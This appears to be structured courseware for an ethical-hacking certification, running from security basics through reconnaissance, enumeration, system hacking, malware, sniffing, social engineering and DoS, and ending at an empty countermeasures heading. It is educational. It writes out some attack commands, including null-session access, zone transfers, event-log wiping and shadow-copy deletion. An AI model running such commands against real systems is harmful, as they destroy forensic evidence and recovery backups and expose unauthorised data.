modules.title: Introduction to Ethical Hacking
modules.description: Covers the fundamentals of information security, ethical hacking concepts, the five phases of hacking, and the legal and regulatory framework that governs security testing. This module lays the foundation for all subsequent CEH topics.
objectives: Understand information security fundamentals including the CIA triad and security controls
Describe the five phases of ethical hacking methodology
Differentiate between types of hackers and threat actors
Identify key information security laws, standards, and regulations
Explain the role and responsibilities of a Certified Ethical Hacker

topics.title: Information Security Fundamentals
topics.content:
Information security revolves around protecting the Confidentiality, Integrity, and Availability (CIA) of data.

  • Confidentiality ensures that data is accessible only to authorized parties.
  • Integrity ensures that data remains accurate and unmodified by unauthorized users.
  • Availability ensures that information and resources are accessible to authorized users whenever they are needed. This involves maintaining hardware, performing repairs, and keeping systems running to prevent disruptions. Denial-of-service (DoS) attacks are a direct threat to availability, exhausting a system's resources.

Additional security concepts include Authentication, Authorization, and Non-repudiation (AAA). Non-repudiation guarantees that the sender cannot deny having sent a message. Defense in depth is a security strategy that employs multiple layers of security controls placed throughout an information technology system, so if one layer fails, the next layer will stop the threat.

topics.title: Ethical Hacking Concepts
topics.content:
Ethical hacking involves authorized attempts to gain unauthorized access to systems to identify vulnerabilities (e.g., input validation flaws or buffer overflows). Hackers are categorized by their intent and permissions:

  • Black Hat: Hackers who violate computer security for personal gain, malicious intent, or other harmful purposes without authorization.
  • White Hat: Ethical hackers who have permission and positive intent to use their skills defensively.
  • Gray Hat: Hackers who may violate laws but without malicious intent, hacking without permission but often notifying the target.
  • Script Kiddies: Unskilled individuals who use tools created by others.
  • Hacktivists: Hackers who break into systems to promote political or social change.
  • State-Sponsored Actors (APTs): Highly skilled and well-funded attackers backed by a government.
  • Insider Threats: Come from within the organization, such as a disgruntled employee.

Security testing methods differ by the knowledge provided to the tester:

  • Black Box Testing: Also known as zero-knowledge testing, performed when the tester has no prior knowledge of the target infrastructure, simulating a real-world external attacker.
  • White Box Testing: Provides full knowledge of the target environment.
  • Gray Box Testing: Provides partial knowledge of the target environment.

topics.title: Hacking Methodology and Frameworks
topics.content:
The ethical hacking methodology defines five core phases:

  • Reconnaissance (Footprinting): The first phase where the attacker gathers information without direct interaction (passive) or with interaction (active). Passive reconnaissance involves searching public records, social media, and WHOIS data.
  • Scanning: Probing the target for open ports, services, and vulnerabilities.
  • Gaining Access (Exploitation): Exploiting vulnerabilities to enter the system.
  • Maintaining Access: Establishing persistent access by installing backdoors. In the Cyber Kill Chain, this corresponds to the Installation phase (installing backdoors or rootkits), prior to Command and Control (C2).
  • Covering Tracks: Removing evidence of the intrusion.

Frameworks like the NIST Cybersecurity Framework provide structure for defensive operations, consisting of five core functions: Identify, Protect, Detect, Respond, and Recover. The Detect function specifically focuses on continuous monitoring to identify the occurrence of a cybersecurity event.

topics.title: Security Controls
topics.content:
Security controls are safeguards designed to protect information systems. They are classified into three categories:

  • Technical Controls (Logical Controls): Use technology to protect information systems. Examples include firewalls, IDS/IPS, encryption, and access control lists.
  • Administrative Controls: Involve policies, procedures, training, and risk assessments.
  • Physical Controls: Tangible safeguards like fences, locks, guards, and security cameras.

These controls are implemented as part of a Defense in Depth strategy to provide layered security.

topics.title: Information Security Laws and Standards
topics.content:
Ethical hackers must operate within legal frameworks and understand regulations. A key component of legal testing is the Rules of Engagement (ROE) document (or Penetration Testing Agreement), which defines the scope, boundaries, methods, timelines, and legal protections for a penetration test.

Key laws and standards include:

  • Computer Fraud and Abuse Act (CFAA): The primary U.S. federal law that criminalizes unauthorized access to computer systems, fraud, and damage to computing infrastructure.
  • GDPR: European regulation for data protection.
  • HIPAA: U.S. law protecting healthcare data and patient privacy.
  • SOX: U.S. law covering corporate financial reporting.
  • FISMA: U.S. law governing federal information systems.
  • PCI DSS: Standard for payment card data security.

modules.title: Footprinting and Reconnaissance
modules.description: Explores passive and active reconnaissance techniques used to gather information about target organizations, including OSINT, DNS footprinting, Whois lookups, and social media intelligence gathering.
objectives: Perform passive and active reconnaissance against a target
Use OSINT tools and techniques to gather intelligence
Conduct DNS and Whois footprinting
Extract information from social media, websites, and email headers
Understand countermeasures against footprinting

topics.title: OSINT (Open Source Intelligence)
topics.content:
OSINT involves collecting publicly available information about a target from open sources.

  • Google Dorking: Uses advanced search operators. For example, the operator site:target.com filetype:pdf combines site: (restricts to domain) and filetype: (filters for a specific extension) to find exposed PDF files.
  • theHarvester: An OSINT tool specifically designed for harvesting email addresses, subdomains, hosts, and employee names from public sources like search engines, PGP key servers, and SHODAN.
  • Maltego: A powerful OSINT and link analysis tool that provides graphical visualization of relationships between entities (people, companies, domains, IP addresses, infrastructure).

topics.title: DNS Footprinting
topics.content:
DNS footprinting involves querying DNS servers to map out infrastructure.

  • nslookup: A command-line tool used to query DNS servers for various record types including A, MX (mail exchange), NS (name server), CNAME, and SOA records.
  • Zone Transfers (AXFR): If misconfigured, a DNS server may allow a full zone transfer, exposing the complete list of DNS records to any requesting host. This can be accomplished using commands like: dig axfr target.com @dns-server, nslookup -type=AXFR target.com dns-server, or host -l target.com dns-server.
  • Subdomain Enumeration: Techniques like DNS enumeration and subdomain brute-forcing (using tools like Sublist3r, Amass, and dnsrecon) or checking certificate transparency logs can reveal hidden services and expanded attack surfaces.

topics.title: Whois and Network Footprinting
topics.content:
WHOIS is a query and response protocol used to look up domain registration information. It provides vital details during reconnaissance, including:

  • Registrant's name and organization
  • Contact information (email, phone number)
  • Registration and expiration dates
  • Name servers

Network footprinting also involves using traceroute to map network paths and identifying network ranges through Regional Internet Registries (RIRs).

topics.title: Website and Email Footprinting
topics.content:
Website footprinting involves examining a target's web presence.

  • Passive Web Footprinting: The Wayback Machine (web.archive.org) is a powerful tool for passive footprinting. It stores historical snapshots of websites, revealing old versions of a target's site without direct interaction, which may expose previously published content, employee info, or deprecated technologies.
  • Banner Grabbing / Header Analysis: HTTP response headers can reveal specific software versions (e.g., X-Powered-By: PHP/7.4.3 or Server: Apache/2.4.41). Attackers use this information to search vulnerability databases (like CVE) for known exploits targeting those exact versions.

topics.title: Social Media Intelligence (SOCMINT)
topics.content:
Social media platforms are rich sources of intelligence. Passive reconnaissance often involves searching for the target company and its employees on platforms like LinkedIn and Glassdoor. Because this uses publicly available information without direct interaction with the target's systems, it is strictly passive.

This information helps attackers map organizational structures, identify technologies used (from job postings), and gather personal details that can be leveraged in social engineering attacks.

v13Updates: Advanced OSINT with machine learning classifiers

modules.title: Scanning Networks
modules.description: Covers network scanning methodologies including host discovery, port scanning, service enumeration, OS fingerprinting, and vulnerability scanning using tools like Nmap.
objectives: Explain the different types of network scans and their purposes
Perform host discovery, port scanning, and service detection using Nmap
Understand TCP/IP communication and the three-way handshake
Conduct OS fingerprinting and banner grabbing
Identify scanning countermeasures

topics.title: Network Scanning Methodology & Port Responses
topics.content:
Network scanning identifies live systems, open ports, and services. Understanding TCP/IP communication is crucial.

  • Common Ports: Port 443 is the well-known port for HTTPS (HTTP over TLS/SSL). Port 80 is HTTP, 8080 is an alternative HTTP, and 22 is SSH.
  • Port States and Responses: When an open port receives a TCP SYN packet, it responds with SYN-ACK. When a closed port receives a TCP SYN packet, it responds with a RST-ACK (Reset-Acknowledge) packet.
  • Firewall Filtering: If a host responds to a SYN packet with no response on most ports but returns ICMP Type 3, Code 13 (Communication Administratively Prohibited) on some ports, it indicates that a firewall or packet filtering device is actively blocking the traffic and explicitly rejecting it.

topics.title: Nmap Scan Types and Techniques
topics.content:
Nmap provides numerous scan techniques tailored for different scenarios:

  • SYN Stealth Scan (-sS): Performs a half-open scan by sending SYN packets and analyzing the response without completing the three-way handshake, making it less likely to be logged.
  • XMAS Scan (-sX): Sends TCP packets with the FIN, PSH, and URG flags set (lit up like a Christmas tree). It can bypass some stateless firewalls. Closed ports should respond with RST, while open/filtered ports do not respond.
  • Idle Scan (-sI): Uses a zombie host as a proxy to scan the target without sending packets directly to the target. The attacker sends spoofed packets using the zombie's IP and monitors changes in the zombie's IP ID sequence. This is the stealthiest Nmap scan.
  • Timing Templates: The -T5 (Insane) timing template provides the fastest scan speed but generates a high volume of rapid traffic, making it the most likely to be detected by IDS/IPS. -T0 (Paranoid) and -T1 (Sneaky) are designed for evasion.

topics.title: OS Fingerprinting and Banner Grabbing
topics.content:
Identifying the operating system and running services is critical for finding targeted vulnerabilities.

  • OS Fingerprinting (nmap -O): The -O flag enables OS detection. Nmap analyzes responses to specially crafted TCP/IP probes (TCP ISN sampling, IP ID sequences, stack characteristics) to determine the target's operating system.
  • Banner Grabbing: The primary purpose of banner grabbing (using nmap -sV, Netcat, or Telnet) is to connect to an open port and read the welcome message or headers to identify the service name, version number, and operating system running on that port.

topics.title: Vulnerability Scanning with Nmap
topics.content:
The Nmap Scripting Engine (NSE) allows Nmap to perform advanced vulnerability scanning. By using scripts like --script=vuln, attackers can identify known flaws.

For example, if a scan against port 445 returns smb-vuln-ms17-010: VULNERABLE, it indicates the target is vulnerable to EternalBlue, a critical SMB remote code execution exploit (CVE-2017-0144) notoriously used in WannaCry and NotPetya attacks. This means the system is missing critical security patches.

v13Updates: Automated vulnerability correlation with threat intelligence

modules.title: Enumeration
modules.description: Details the techniques used to extract detailed information from target systems including usernames, network shares, services, and configurations through various enumeration protocols.
objectives: Understand the purpose and techniques of enumeration
Perform NetBIOS, SNMP, LDAP, and DNS enumeration
Enumerate SMB shares, NFS exports, and SMTP users
Conduct Active Directory enumeration
Apply enumeration countermeasures

topics.title: Enumeration Concepts
topics.content: Enumeration is the primary purpose of actively connecting to a target system to extract detailed information such as usernames, group names, network shares, services, DNS details, and application banners. Unlike passive reconnaissance, enumeration involves direct and active interaction with the target, typically requiring some level of access or exploiting misconfigured services.

topics.title: NetBIOS and SMB Enumeration
topics.content:
SMB and NetBIOS enumeration are critical in Windows environments.

  • NetBIOS Suffix Codes: These codes identify services. The <00> suffix identifies the Workstation Service. <20> represents the Server (File Sharing) service.
  • Null Sessions: An attacker can establish an anonymous connection using the command net use \\target\IPC$ "" /u:"". The purpose is to enumerate users, shares, and groups without credentials through the IPC$ (Inter-Process Communication) share.
  • Administrative Shares: During SMB enumeration, finding the C$ share accessible indicates access to the default administrative share for the C: drive, a hidden share meant for administrators.
  • enum4linux: This tool enumerates Windows/Samba systems primarily by leveraging the SMB/CIFS protocol (via RPC calls over named pipes). It can perform "RID cycling" to enumerate accounts like Administrator (RID 500) and Guest (RID 501).

topics.title: SNMP Enumeration
topics.content:
Simple Network Management Protocol (SNMP) uses UDP port 161. When improperly configured, it can reveal extensive system information, network interfaces, routing tables, and running processes.

SNMPv1 and v2c rely on community strings for access control. The default read-only string is typically public. The default read-write community string is private; if left at this default value, it allows an attacker to not only read but also modify device configurations, creating a critical vulnerability.

topics.title: LDAP and DNS Enumeration
topics.content:
LDAP Enumeration: The ldapsearch command-line utility is used to query LDAP directories (ports 389/636). In Active Directory environments, it can extract detailed information about users, groups, organizational units, and computer accounts.

DNS Enumeration: After performing a successful zone transfer, attackers obtain a complete list of all DNS records. The AAAA record maps a hostname to a 128-bit IPv6 address, whereas an A record maps to an IPv4 address. Exposing AAAA records can reveal IPv6 infrastructure.

topics.title: NFS Enumeration
topics.content:
The Network File System (NFS) allows sharing directories over a network. During an engagement, discovering an NFS export that allows mounting by any host (* in the exports list) is a major finding.

To list available NFS shares on the target, an attacker would use the command showmount -e target. The primary security concern is unauthorized access to sensitive files, configuration data, and potentially SSH keys.

v13Updates: Zero Trust impact on legacy enumeration techniques

modules.title: Vulnerability Analysis
modules.description: Explores the vulnerability management lifecycle, scoring systems (CVSS), and the use of automated scanning tools to identify and prioritize system weaknesses.
objectives: Understand the vulnerability management lifecycle
Differentiate between vulnerability assessment and penetration testing
Interpret CVSS v3.1 scores and metrics
Perform vulnerability scanning using tools like Nessus
Analyze scan results and prioritize remediation

topics.title: Vulnerability Management and Concepts
topics.content:
A vulnerability assessment identifies, quantifies, and prioritizes vulnerabilities in a system but stops short of exploitation. In contrast, a penetration test actively exploits discovered vulnerabilities to demonstrate real-world impact. A zero-day vulnerability is a flaw that is actively exploited before the vendor has released a patch.

The vulnerability management lifecycle includes Discovery, Assessment, Remediation, and Verification. Remediation involves deploying patches to fix vulnerabilities. Organizations may also choose Risk Acceptance, deciding not to fix a vulnerability because the cost outweighs the risk. Continuous vulnerability management involves ongoing, automated scanning and monitoring of systems to detect new vulnerabilities, offering real-time visibility rather than periodic assessments.

topics.title: CVSS and Vulnerability Databases
topics.content:
CVSS (Common Vulnerability Scoring System) is an open framework used to rate the severity of software vulnerabilities. In CVSS v3.1, a base score of 9.8 is classified as Critical (Critical range is 9.0 - 10.0). The Temporal Metrics group measures characteristics of a vulnerability that change over time, such as the availability of exploit code (Exploit Code Maturity) or patches (Remediation Level).

Key databases and standards include:

  • CVE (Common Vulnerabilities and Exposures): A list of publicly disclosed vulnerabilities.
  • NVD (National Vulnerability Database): A U.S. government repository of standards-based vulnerability data that synchronizes with the CVE list and provides CVSS scores.
  • CWE (Common Weakness Enumeration): A database maintained by MITRE listing common software and hardware weakness types.
  • OVAL (Open Vulnerability and Assessment Language): A standard language often used to structure and share vulnerability assessment data.

topics.title: Scanning Techniques and Tools
topics.content:
Vulnerability scanning can be performed using various techniques:

  • Active Scanning: Sends packets to the target and analyzes the responses.
  • Passive Scanning: Observes network traffic to identify active systems, open ports, and vulnerabilities without sending active probes.
  • Credentialed vs Non-credentialed: Credentialed scans log into the target system and can inspect local configurations, detect missing patches, and verify installed software. This is significantly more accurate and thorough than non-credentialed scans.
  • Static Analysis (SAST): Involves analyzing the application's source code without executing it.

Common tools include Tenable Nessus (a widely-used commercial vulnerability scanner), OpenVAS (Greenbone) (an open-source alternative), and Nikto (an open-source scanner primarily used for web applications).

topics.title: Analyzing Scan Results
topics.content:
Analyzing scan results requires validating the findings. A false positive occurs when a scanner incorrectly reports a vulnerability that does not actually exist. Conversely, a false negative is a dangerous scenario where a real vulnerability exists but is not detected.

Proper remediation depends on the severity. For example, if a scan identifies a critical vulnerability like Heartbleed (CVE-2014-0160) in OpenSSL, the appropriate next step is to verify the finding manually, prioritize patching to the latest secure version, and subsequently revoke and reissue affected SSL certificates, as private keys may have been compromised.

modules.title: System Hacking
modules.description: Covers the core techniques for compromising systems including password cracking, privilege escalation, maintaining persistent access, steganography, and covering tracks.
objectives: Understand password cracking techniques and tools
Perform horizontal and vertical privilege escalation
Establish persistent access using backdoors and rootkits
Hide data using steganography and alternate data streams
Clear tracks by modifying logs and timestamps

topics.title: Password Cracking Techniques
topics.content:
Password cracking is a fundamental phase in system hacking aimed at recovering plain-text passwords from stored hashes or intercepted network traffic.

  • Offline Password Cracking: Attackers often prefer offline cracking because it does not generate network traffic or trigger account lockouts. A prime tool for this is John the Ripper, which tests captured password hashes against wordlists and applies mangling rules.
  • Brute Force vs. Dictionary Attacks: A brute force attack systematically attempts every possible combination of characters until the correct password is found. While guaranteed to work eventually, it is extremely slow. A dictionary attack relies on a precompiled list of common words and passwords.
  • Windows SAM Database: In Windows environments, local user credentials are stored as NTLM hashes in the Security Account Manager (SAM) database (C:\Windows\System32\config\SAM). Accessing this database is a primary goal for attackers.
  • Pass-the-Hash (PtH): Instead of cracking the hash, attackers can use the NTLM hash directly to authenticate to other Windows systems on the network. This powerful technique bypasses the need to know the plaintext password altogether.

topics.title: Privilege Escalation
topics.content:
Once initial access is gained, an attacker often finds themselves with limited privileges. Privilege escalation is the process of exploiting vulnerabilities, misconfigurations, or design flaws to gain higher-level access.

  • Vertical vs. Horizontal Escalation: Vertical escalation involves elevating a lower-privileged account to administrative or root rights. Horizontal escalation involves accessing another user's account and resources at the same privilege level.
  • SUID Binaries in Linux: A critical misconfiguration in Linux involves SUID (Set User ID) binaries owned by root. When an SUID binary has a vulnerability, such as a buffer overflow, exploiting it will spawn a shell or process running with the file owner's privileges (root), granting full system control.
  • /etc/passwd Vulnerability: In modern Linux systems, password hashes should be safely stored in /etc/shadow. If a penetration tester finds actual hashed passwords in /etc/passwd instead of the expected 'x' placeholder, it indicates that shadow passwords are not enabled. Since /etc/passwd is world-readable, this is a significant security weakness that allows any local user to perform offline cracking.

topics.title: Maintaining Access
topics.content:
After successfully elevating privileges, attackers strive to establish persistent access. This ensures that even if the system is rebooted or the compromised credentials are changed, the attacker can seamlessly reconnect.

  • Backdoors and Trojans: Attackers deploy malicious software that listens on hidden ports, providing remote command execution without requiring traditional authentication.
  • Rootkits: These are sophisticated malware designed to hide the existence of processes, files, or network connections from the operating system, operating either in user-mode or kernel-mode.
  • Alternative Access Mechanisms: Attackers frequently create hidden administrator accounts, configure scheduled tasks, or modify registry run keys to guarantee their payloads are executed automatically upon system startup.

topics.title: Steganography
topics.content:
Steganography is the practice of concealing secret data within ordinary, non-secret files or messages (carrier files) to avoid detection.

  • Concept: Unlike cryptography, which scrambles data to make it unreadable, steganography hides the very existence of the data. To an observer, the file simply looks like a normal image or audio track.
  • Techniques and Tools: Data can be hidden in images, audio, video, or even whitespace in text documents. Common techniques include Least Significant Bit (LSB) insertion. Tools widely used for this purpose include OpenStego, Steghide, and Snow.

topics.title: Covering Tracks
topics.content:
The final phase of system hacking involves removing evidence of the unauthorized access to evade detection by security teams and hinder forensic investigations.

  • Clearing Windows Event Logs: Attackers routinely clear the Security, System, and Application event logs to destroy records of failed logins, process creations, and privilege changes. This can be achieved using commands like wevtutil cl Security or the Meterpreter command clearev.
  • Deleting Volume Shadow Copies: On Windows systems, attackers (and notably ransomware operators) use commands like wmic shadowcopy delete to delete Volume Shadow Copies. This prevents system recovery and removes forensic evidence stored in those backup snapshots.
  • Other Methods: Attackers also clear bash history on Linux systems, modify file timestamps (Timestomping), and disable auditing policies.

modules.title: Malware Threats
modules.description: Examines types of malware including viruses, worms, Trojans, ransomware, and APTs. Covers malware analysis techniques and evasion strategies.
objectives: Classify different types of malware and their characteristics
Understand Advanced Persistent Threats (APTs) and their lifecycle
Explain fileless malware techniques and evasion methods
Perform basic static and dynamic malware analysis
Identify anti-malware countermeasures and solutions

topics.title: Types of Malware
topics.content:
Understanding the fundamental behavior of different malicious software is critical for threat detection and response.

  • Trojan: Named after the Trojan Horse, this malware disguises itself as legitimate or desirable software to trick users into installing it. Unlike viruses, Trojans do not self-replicate. They typically open backdoors for remote access.
  • Worm vs. Virus: A virus attaches itself to legitimate files and requires user interaction (like executing a program) to spread. A worm, however, is standalone malware that can self-replicate and spread rapidly across networks automatically, requiring no user interaction.
  • Ransomware: This malicious software encrypts the victim's files and demands payment (usually in cryptocurrency) for the decryption key. Modern variants often use double extortion—encrypting the data and threatening to leak sensitive information publicly if the ransom is not paid.
  • Dropper: Often delivered via phishing, a dropper is a preliminary piece of malware (like a malicious document with a macro) designed solely to connect to a remote server, download, and install a more destructive second-stage payload.

topics.title: Advanced Persistent Threats (APTs)
topics.content:
Advanced Persistent Threats (APTs) are sophisticated, targeted, and prolonged cyberattacks typically orchestrated by well-funded groups, such as nation-states.

  • Characteristics: APTs are characterized by a long dwell time—meaning the attackers remain patient and operate stealthily inside a corporate network for months or even years without detection.
  • Objectives: Rather than causing immediate disruption, APTs focus on specific targets to systematically exfiltrate highly sensitive data, intellectual property, or strategic intelligence.

topics.title: Fileless Malware
topics.content:
Fileless malware is an advanced memory-based attack technique that leaves little to no footprint on the hard drive.

  • Mechanism: Instead of writing executable files to disk, fileless malware operates entirely in RAM. It leverages legitimate, built-in system administration tools—often referred to as Living-off-the-Land Binaries (LOLBins)—such as PowerShell, WMI, or the Windows Registry to execute its malicious code.
  • Evasion: Because there are no traditional malicious files to scan, fileless malware easily evades signature-based antivirus detection. Combating it requires advanced behavioral analysis and Endpoint Detection and Response (EDR) solutions.

topics.title: Malware Analysis Techniques
topics.content:
Malware analysis is essential for understanding how a specific threat operates and how to defend against it.

  • Static Analysis: Examining the malicious file without executing it. This involves reviewing file hashes, extracting strings, inspecting PE headers, and reverse-engineering the code.
  • Dynamic (Behavioral) Analysis: This involves executing the malware in a controlled, isolated virtual environment (a sandbox, such as Cuckoo Sandbox) to observe its real-time behavior. Analysts monitor file system changes, registry modifications, process creation, and network connections.

topics.title: Malware Evasion and Countermeasures
topics.content:
Malware authors continuously develop sophisticated techniques to bypass security controls and analysis environments.

  • Polymorphic Malware: This type of malware changes its underlying code, encryption, or appearance with each replication or infection. While its core function remains the same, its unique signature changes every time, rendering traditional signature-based antivirus completely ineffective.
  • Sandbox Evasion / Anti-Analysis: Advanced malware checks its environment before executing the payload. If it detects virtual machine artifacts (like specific MAC addresses or driver names), debugging tools, or sandbox environments, it will remain dormant or terminate itself to avoid behavioral detection.
  • Kernel-Level Rootkits: These operate deep within the OS kernel by hooking system calls. This allows them to effectively hide malicious processes, files, and network activity from user-space security tools, making them notoriously difficult to detect and remove.

modules.title: Sniffing
modules.description: Covers packet sniffing concepts, network traffic analysis, and attacks on network infrastructure including MAC flooding, ARP spoofing, DHCP starvation, and DNS spoofing.
objectives: Understand active and passive sniffing concepts
Perform network traffic analysis using Wireshark and tcpdump
Execute MAC flooding and CAM table exhaustion attacks
Perform ARP spoofing, DHCP starvation, and DNS poisoning
Implement network sniffing countermeasures

topics.title: Packet Sniffing Concepts
topics.content:
Sniffing involves capturing and analyzing network traffic as it flows across a network. It can be categorized into two main types:

  • Passive Sniffing: Used in networks utilizing hubs (which broadcast traffic to all ports). The attacker simply places their Network Interface Card (NIC) in promiscuous mode to capture all traffic on the collision domain without sending any additional packets.
  • Active Sniffing: Required in switched networks (which only send traffic to the specific destination port). To capture traffic intended for others, the attacker must actively inject packets into the network to manipulate the switch's behavior (e.g., via ARP spoofing or MAC flooding).
  • SPAN/Mirror Ports: In enterprise environments, security tools (like an IDS) are connected to a Switch Port Analyzer (SPAN) or mirror port to passively monitor a copy of all network traffic.

topics.title: Network Traffic Analysis Tools
topics.content:
Effective traffic analysis requires specialized tools to capture and dissect packets.

  • Wireshark: The industry-standard graphical network protocol analyzer. It allows users to capture traffic in real-time or read from PCAP (Packet Capture) files. Wireshark utilizes powerful display filters (e.g., tcp.port == 80) to isolate specific traffic of interest.
  • tcpdump: A robust command-line packet analyzer used widely in Unix/Linux environments. It uses capture filters (BPF syntax) to restrict which packets are saved to disk or displayed, minimizing resource usage during high-volume captures.

topics.title: MAC Attacks and Switch Exploitation
topics.content:
Switches maintain a Content Addressable Memory (CAM) table to map MAC addresses to physical ports.

  • MAC Flooding (CAM Table Exhaustion): An attacker floods the switch with thousands of forged Ethernet frames, each with a different fake source MAC address. This rapidly fills the CAM table. Once full, most switches fail-open and revert to behaving like a hub, broadcasting all incoming traffic out of every port. This allows the attacker to passively sniff traffic meant for other hosts. Tools like macof are commonly used for this.
  • Switch Spoofing (VLAN Hopping): Attackers negotiate a trunk link with the switch (e.g., by exploiting DTP) to gain access to traffic from all VLANs.

topics.title: ARP, DHCP, and DNS Spoofing
topics.content:
These attacks manipulate fundamental network protocols to intercept traffic.

  • ARP Spoofing/Poisoning: Address Resolution Protocol (ARP) lacks authentication. An attacker sends spoofed ARP replies to a target and the default gateway, associating the attacker's MAC address with the gateway's IP address. This successfully establishes a Man-in-the-Middle (MitM) position.
  • DHCP Starvation and Rogue DHCP: An attacker broadcasts thousands of DHCP requests with spoofed MAC addresses, exhausting the legitimate DHCP server's IP pool (starvation). They then introduce a Rogue DHCP server to assign IP addresses to clients, configuring the attacker's machine as the default gateway or DNS server.
  • DNS Spoofing/Poisoning: The attacker intercepts DNS requests and replies with a spoofed IP address, redirecting the victim's traffic from a legitimate site (e.g., a bank) to an attacker-controlled malicious site.

topics.title: Sniffing Countermeasures
topics.content:
Defending against sniffing and active network manipulation requires network infrastructure security.

  • Dynamic ARP Inspection (DAI): Validates ARP packets in a network by intercepting, logging, and discarding ARP packets with invalid IP-to-MAC address bindings.
  • Port Security: Mitigates MAC flooding by limiting the number of valid MAC addresses allowed on a specific switch port.
  • DHCP Snooping: Prevents rogue DHCP servers by designating specific ports as 'trusted' (allowed to send DHCP replies) and all others as 'untrusted'.
  • Encryption: Ensuring all network communication utilizes strong encryption (e.g., HTTPS, SSH, VPNs) renders captured packets unreadable to the attacker.

v13Updates: Advanced PCAP analysis with AI tools

modules.title: Social Engineering
modules.description: Explores the psychological manipulation of people to extract sensitive information, covering various attack vectors including phishing, deepfakes, physical techniques, and effective countermeasures.
objectives: Understand the psychological principles of influence
Identify common social engineering attack vectors
Recognize the role of AI and deepfakes in modern attacks
Describe physical social engineering techniques
Implement comprehensive security awareness training

topics.title: Social Engineering Concepts and Vectors
topics.content:
Social engineering relies on manipulating human psychology rather than exploiting technical flaws.

  • Phishing: The most common vector, involving mass fraudulent emails designed to trick users into revealing credentials or installing malware.
  • Spear Phishing and Whaling: Spear phishing is highly targeted at specific individuals or organizations using customized information. Whaling is a specialized form of spear phishing that specifically targets high-profile executives (C-level).
  • Vishing and Smishing: Vishing (voice phishing) leverages phone calls to deceive victims, often spoofing caller ID. Smishing uses SMS text messages containing malicious links.
  • Pretexting: The attacker creates a fabricated scenario (the pretext) to compel the victim to divulge information or perform an action.

topics.title: Psychological Principles of Influence
topics.content:
Effective social engineers exploit human nature using core psychological principles.

  • Authority: People are conditioned to obey authority figures. An attacker might impersonate a CEO, IT Director, or law enforcement officer to force compliance.
  • Urgency and Scarcity: Creating a false sense of urgency (e.g., 'Your account will be suspended in 24 hours') prevents the victim from thinking critically and forces immediate action.
  • Consensus (Social Proof): Influencing a target by suggesting that others in the organization have already complied with the request.
  • Familiarity (Liking): People are more likely to comply with requests from people they know or like. Attackers use compromised accounts of colleagues to leverage this trust.

topics.title: Deepfakes and AI in Social Engineering
topics.content:
The integration of Artificial Intelligence has dramatically elevated the sophistication of social engineering.

  • Synthetic Media (Deepfakes): Attackers use deep learning algorithms to create highly convincing, fake audio or video of real people.
  • AI Impersonation (Vishing 2.0): Attackers can clone a CEO's voice using a small sample of public audio and use it in real-time phone calls to authorize fraudulent wire transfers (Business Email Compromise or BEC attacks). Real-world incidents have demonstrated multi-million dollar losses from deepfake-enabled social engineering.
  • AI-Generated Phishing: LLMs are now used to rapidly generate flawless, highly personalized spear-phishing emails devoid of the traditional spelling and grammar errors that previously served as red flags.

topics.title: Physical Social Engineering
topics.content:
Attackers also leverage physical access to bypass technical security perimeters.

  • Tailgating and Piggybacking: Tailgating occurs when an unauthorized person closely follows an authorized person into a secure area without their knowledge. Piggybacking is similar but typically implies the authorized person is aware and holds the door out of courtesy.
  • Dumpster Diving: Searching through organizational trash for sensitive documents, organizational charts, hardware manuals, or old storage media. It is a critical information gathering technique.
  • Shoulder Surfing: Directly observing a target entering passwords or viewing sensitive information on a screen.

topics.title: Social Engineering Countermeasures
topics.content:
Because social engineering targets human psychology rather than software flaws, defense requires a combination of education, testing, and strict policies.

  • Primary Defenses: The most effective countermeasures include comprehensive, regular security awareness training and conducting periodic phishing simulations to test and educate the workforce on identifying modern threats.
  • Verification Procedures: For highly targeted attacks like BEC and deepfake impersonations, organizations must implement strict, out-of-band verification procedures (like requiring a separate phone call to an established, known internal number) for any significant financial transactions or sensitive data transfers.
  • Zero Trust Architecture: Enforcing a 'never trust, always verify' model minimizes the blast radius if an employee's account is compromised via social engineering.

modules.title: Denial-of-Service
modules.description: Covers DoS and DDoS attack concepts, techniques, and tools including volumetric, protocol, and application-layer attacks, along with mitigation strategies.
objectives: Differentiate between DoS and DDoS attacks
Classify attack types: volumetric, protocol, and application-layer
Understand botnet architecture and amplification techniques
Explain specific attacks like SYN flood, UDP flood, and Slowloris
Implement DoS/DDoS detection and countermeasures

topics.title: DoS vs. DDoS and Botnets
topics.content:
Denial-of-Service attacks aim to render a target system, network, or application unavailable to its legitimate users.

  • DoS vs. DDoS: A Denial-of-Service (DoS) attack originates from a single source system. In contrast, a Distributed Denial-of-Service (DDoS) attack leverages multiple distributed, compromised systems to simultaneously flood the target, making it vastly more powerful and difficult to block using simple IP blacklists.
  • Botnets: DDoS attacks are typically executed using a botnet—a massive network of compromised computers or IoT devices (zombies) controlled remotely by a botmaster through a Command and Control (C2) infrastructure. The infamous Mirai botnet notoriously targeted Linux-based IoT devices (like cameras and routers) by exploiting factory-default credentials over open Telnet ports.

topics.title: Volumetric and Protocol Attacks
topics.content:
These attacks focus on exhausting network bandwidth or the processing capacity of network infrastructure.

  • SYN Flood: A classic protocol attack that exploits the TCP three-way handshake. The attacker sends a massive volume of SYN requests but intentionally never completes the final ACK. The server allocates connection state resources for these half-open connections, eventually exhausting its connection table and crashing.
  • Smurf Attack: An attacker sends ICMP echo requests (pings) to a network's broadcast address, but spoofs the source IP address to be that of the victim. Every host on the broadcast network replies to the victim, creating a massive amplification of traffic.

topics.title: Amplification and Reflection Attacks
topics.content:
Amplification attacks exploit vulnerabilities in UDP-based protocols to reflect a large volume of traffic onto a victim using a very small initial request.

  • DNS Amplification: The attacker sends small DNS queries to open recursive resolvers with the victim's IP spoofed as the source. Because DNS responses (especially with DNSSEC or ANY queries) are significantly larger than the queries (often 28-54 times larger), the resolvers flood the victim with massive responses. High volumes of UDP packets targeting port 53 with large response sizes characterize a DNS amplification attack.
  • NTP Amplification: Exploits the monlist command in older NTP servers to return a large list of recently connected hosts, achieving an amplification factor of up to 556x.

topics.title: Application Layer Attacks
topics.content:
Layer 7 (Application Layer) attacks are designed to exhaust the resources of specific applications or web servers rather than raw network bandwidth. They can be highly effective with relatively low volumes of traffic.

  • HTTP Floods: These attacks send seemingly legitimate HTTP requests that consume server resources, blending in with legitimate traffic.
  • Slowloris: This attack operates by sending partial HTTP requests very slowly to keep numerous connections open on the web server. By never completing the request, it eventually exhausts the server's concurrent connection pool without requiring high attacker bandwidth.
  • RUDY (R-U-Dead-Yet): Similar to Slowloris, but works by sending an HTTP POST request with a very large Content-Length header, and then sending the actual data at an extremely slow rate (e.g., one byte at a time).

topics.title: DoS/DDoS Countermeasures
topics.content:
